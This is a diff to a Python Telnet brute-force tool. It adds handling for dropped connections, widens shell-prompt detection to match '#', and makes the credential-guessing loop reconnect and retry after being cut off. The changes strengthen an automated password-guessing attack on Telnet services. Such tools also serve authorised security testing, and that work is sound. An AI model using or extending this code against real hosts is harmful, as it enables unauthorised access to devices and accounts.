@@ -110,6 +110,7 @@ def get_telnet_status (host, port=23, timeout=2):
 class TelnetLoginStatus(Enum):
     """ An enumeration of ready states that a Telnet connection can hold.
     """
+    DROPPED_CONN = -1
     LOGIN_INCORRECT = 0
     SHELL_PROMPT = 1
     LOGIN_PROMPT = 2
@@ -126,7 +127,7 @@ def get_status (tn):
     """
     result = tn.expect([
         b'incorrect',
-        b'Last login:',
+        b'Last login:|#',
         b'login:',
         b'Password:',
         b'exceeded'])
@@ -153,7 +154,7 @@ def guess (tn, login, password):
     status = get_status(tn) # Update status.
     if status == TelnetLoginStatus.LOGIN_PROMPT:
         tn.write(login.encode('ascii') + b'\n') # Enter login.
-    elif status == TelnetLoginStatus.MAXED_RETRIES:
+    elif status == TelnetLoginStatus.MAXED_RETRIES or status == TelnetLoginStatus.DROPPED_CONN:
         return LoginAttemptStatus.FAIL_AND_CLOSE # Maxed out our retries.
     status = get_status(tn) # Update status.
     if status == TelnetLoginStatus.PASSWORD_PROMPT:
@@ -307,7 +308,7 @@ def brute (creds, host, port=23, break_on_success=True, timeout=None):
                 break
             refresh_tn() # Refresh connection.
         elif result == LoginAttemptStatus.FAIL_AND_CLOSE: # Our connection was closed.
-            warn('\u2b8f We got bounced because we maxed out our retries. Reconnecting...')
+            warn('\u2b8f We got bounced, maybe because we maxed out our retries. Reconnecting...')
             refresh_tn() # Refresh connection.
             continue # Don't move on to next password.
         fail('\u2193 Login failed with:', login + ':' + password)
